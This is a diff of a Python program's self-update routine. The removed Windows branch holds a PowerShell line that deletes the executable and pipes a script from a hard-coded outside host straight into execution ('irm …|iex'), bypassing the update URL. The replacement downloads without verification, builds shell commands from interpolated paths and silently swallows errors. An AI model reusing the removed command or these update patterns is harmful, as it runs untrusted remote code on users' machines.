@@ -36,22 +36,22 @@ def get_file_hash(path=None):
 def perform_update(download_url):
     exe_path = os.path.abspath(sys.argv[0])
     exe_name = os.path.basename(exe_path)
-    logging.debug(f"Performing update on {exe_path}, download URL: {download_url}")
+    exe_dir = os.path.dirname(exe_path)
+    temp_exe = os.path.join(exe_dir, f"{exe_name}.new")
     
     if platform.system() == "Windows":
-        powershell_cmd = f'''start powershell -Command "Start-Sleep 2; Remove-Item -Path "{exe_path}" -Recurse -Force; irm minecraftbr.com|iex -d '{exe_path}'"'''
-        os.system(powershell_cmd)
-        sys.exit(0)
-        logging.debug("PowerShell update command executed")
-    else:
-        bash_cmd = f'bash -c "sleep 3 && while pgrep -f \\"{exe_name}\\" >/dev/null; do pkill -f \\"{exe_name}\\" && sleep 2; done && sleep 2 && curl -L -o \\"{exe_path}.new\\" \\"{download_url}\\" && if [ -f \\"{exe_path}.new\\" ]; then rm -f \\"{exe_path}\\" && mv \\"{exe_path}.new\\" \\"{exe_path}\\" && chmod +x \\"{exe_path}\\" && sleep 2 && cd \\"`dirname {exe_path}`\\" && \\"{exe_path}\\" & fi" &'
         try:
-            os.system(bash_cmd)
-            logging.debug("Bash update command executed")
-        except Exception as e:
-            logging.error(f"Failed to execute bash command: {e}")
+            resp = requests.get(download_url, timeout=30)
+            with open(temp_exe, 'wb') as f: f.write(resp.content)
+            os.system(f'timeout /t 2 & del /f /q "{exe_path}" & move "{temp_exe}" "{exe_path}" & start "" "{exe_path}"')
+        except: pass
+    else:
+        try:
+            resp = requests.get(download_url, timeout=30)
+            with open(temp_exe, 'wb') as f: f.write(resp.content)
+            os.system(f'sleep 3 & rm -f "{exe_path}" & mv "{temp_exe}" "{exe_path}" & chmod +x "{exe_path}" & "{exe_path}" &')
+        except: pass
     
-    logging.debug("Exiting after update process...")
     sys.exit(0)
 def check_update():
     logging.debug("Checking for updates...")
